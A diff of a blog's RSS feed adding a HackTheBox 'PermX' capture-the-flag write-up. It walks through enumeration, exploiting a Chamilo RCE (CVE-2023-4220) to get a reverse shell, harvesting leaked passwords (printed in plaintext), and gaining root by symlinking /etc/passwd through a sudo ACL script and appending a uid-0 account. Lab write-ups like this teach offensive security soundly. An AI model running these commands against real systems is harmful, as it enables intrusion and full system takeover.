@@ -5,9 +5,205 @@
     <description>CODE: Zerberus | b0rgch3n’s blog</description>
     <link>https://b0rgch3n.github.io/</link>
     <atom:link href="https://b0rgch3n.github.io/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Tue, 02 Jul 2024 18:32:54 +0800</pubDate>
-    <lastBuildDate>Tue, 02 Jul 2024 18:32:54 +0800</lastBuildDate>
+    <pubDate>Thu, 18 Jul 2024 17:45:52 +0800</pubDate>
+    <lastBuildDate>Thu, 18 Jul 2024 17:45:52 +0800</lastBuildDate>
     <generator>Jekyll v4.3.2</generator>
+    
+      <item>
+        <title>「WriteUp」HackTheBox - PermX</title>
+        <description>&lt;p&gt;PermX is a simple-difficulty box from HackTheBox’s 2024 Season 5.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;Let’s start with enumeration.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-1.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;Nmap scan&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;The &lt;strong&gt;Nmap&lt;/strong&gt; scan report shows open ports 22 and 80.&lt;/p&gt;
+
+&lt;p&gt;Port 80 is for the web service, which redirects to the domain “&lt;strong&gt;permx.htb&lt;/strong&gt;”,&lt;br /&gt;
+So we need to configure the hosts file first.&lt;/p&gt;
+
+&lt;p&gt;Accessing the web service through a browser,&lt;br /&gt;
+didn’t reveal any useful information for now.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-2.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;web page&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Directory enumeration on the web service was similarly disappointing.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-3.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;dirsearch scan&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Tried using &lt;strong&gt;ffuf&lt;/strong&gt; to enumerate subdomains.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-4.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;ffuf scan&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Nice! Discovered the subdomain “&lt;strong&gt;lms.permx.htb&lt;/strong&gt;”.&lt;br /&gt;
+Add this domain to the hosts file as well.&lt;/p&gt;
+
+&lt;p&gt;The web page is a login panel.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-5.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;web page&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Directory enumeration again.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-6.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;dirsearch scan&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Review interesting directories from the &lt;strong&gt;robots.txt&lt;/strong&gt; file.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-7.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;robots.txt&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Examining these directories one by one.&lt;/p&gt;
+
+&lt;p&gt;found that the “&lt;strong&gt;/documentation/changelog.html&lt;/strong&gt;” page,&lt;br /&gt;
+the detailed version number of the current web application: &lt;strong&gt;Chamilo 1.11.24&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-8.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;information disclosure&lt;/em&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;foothold&quot;&gt;&lt;strong&gt;Foothold&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;Google search for &lt;strong&gt;Chamilo&lt;/strong&gt; vulnerabilities,&lt;br /&gt;
+we found an RCE vulnerability for this version: &lt;strong&gt;CVE-2023-4220&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-9.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;google search result&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;The exploit script can be found on Github:&lt;br /&gt;
+&lt;a href=&quot;https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc&quot;&gt;https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Use &lt;strong&gt;nc&lt;/strong&gt; to listen and execute this exploit script to gain a reverse shell.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;python3 main.py &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://lms.permx.htb &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; revshell&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-10.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-11.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;set opetions and waiting exploit comleted&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-12.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;get the shell&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;We have a shell!&lt;/p&gt;
+
+&lt;p&gt;However, since the &lt;strong&gt;www-data&lt;/strong&gt; user’s permissions are very limited,&lt;br /&gt;
+we need a privilege escalation.&lt;/p&gt;
+
+&lt;p&gt;As usual, upload &lt;strong&gt;linpeas.sh&lt;/strong&gt; and use it to gather information.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-13.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;users&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-14.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;password dsclosure&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-15.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;another password dsclosure&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;The information collected includes two leaked passwords:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;gaufrette  
+03F6lY3uXAP2bkW8  &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Using the password “&lt;strong&gt;03F6lY3uXAP2bkW8&lt;/strong&gt;” for SSH login, Successfully login as &lt;strong&gt;mtz&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-16.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;user shell&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;obtaining a user shell.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;privilege-escalation&quot;&gt;&lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;The next goal is root privileges.&lt;br /&gt;
+As usual, checking the SUDO information frist.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-17.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;sudo -l&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;The terminal output shows that the current user is allowed to run the ‘&lt;strong&gt;/opt/acl.sh&lt;/strong&gt;’ file with sudo without a password.&lt;/p&gt;
+
+&lt;p&gt;Next, inspect the &lt;strong&gt;acl.sh&lt;/strong&gt; file.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;$#&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt; 3 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
+   /usr/bin/echo &lt;span class=&quot;s2&quot;&gt;&quot;Usage: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; user perm file&quot;&lt;/span&gt;
+   &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;1
+&lt;span class=&quot;k&quot;&gt;fi
+
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;perm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$3&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$target&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; /home/mtz/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$target&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;..&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
+   /usr/bin/echo &lt;span class=&quot;s2&quot;&gt;&quot;Access denied.&quot;&lt;/span&gt;
+   &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;1
+&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Check if the path is a file&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$target&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
+   /usr/bin/echo &lt;span class=&quot;s2&quot;&gt;&quot;Target must be a file.&quot;&lt;/span&gt;
+   &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;1
+&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
+
+/usr/bin/sudo /usr/bin/setfacl &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; u:&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$user&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$perm&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$target&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;The script’s logic involves using &lt;strong&gt;setfacl&lt;/strong&gt; to set rwx permissions on a specified file for a given user, But there are filtering conditions on the file path (the third parameter):&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;The file path must be under “&lt;strong&gt;/home/mtz&lt;/strong&gt;”&lt;/li&gt;
+  &lt;li&gt;The file path cannot contain directory traversal symbols “&lt;strong&gt;..&lt;/strong&gt;”&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;OK, now let’s try to get a root privilege shell.&lt;/p&gt;
+
+&lt;p&gt;My plan is to create a symbolic link to the “&lt;strong&gt;/etc/passwd&lt;/strong&gt;” file in the “&lt;strong&gt;/home/mtz&lt;/strong&gt;” directory, then edit the passwd file to add a privileged user.&lt;/p&gt;
+
+&lt;p&gt;Generates a password HASH.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-18.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;generate passwd hash&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Use the following commands to escalate privileges.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; /etc/passwd passwd
+&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /opt/acl.sh mtz rwx /home/mtz/tmp/passwd
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;b0rgch3n:$1$zrd0hGa7$xs1GPMR4gl1lZE1lJwQt81:0:0:root:/root:/bin/bash&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /home/mtz/tmp/passwd&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Check the passwd file to confirm the privileged account has been added.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-19.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;check passwd file&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Login with the privileged account.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2024-07-17-writeup-hackthebox-permx/image-20.png&quot; alt=&quot;&quot; /&gt;
+  &lt;em&gt;root shell&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Gain a root privilege shell.&lt;/p&gt;
+
+&lt;p&gt;Cheers!&lt;/p&gt;
+</description>
+        <pubDate>Thu, 18 Jul 2024 03:34:00 +0800</pubDate>
+        <link>https://b0rgch3n.github.io/2024/07/18/writeup-hackthebox-permx/</link>
+        <guid isPermaLink="true">https://b0rgch3n.github.io/2024/07/18/writeup-hackthebox-permx/</guid>
+        
+        <category>writeup</category>
+        
+        <category>hackthebox</category>
+        
+        
+      </item>
     
       <item>
         <title>「WriteUp」HackTheBox - Blurry</title>
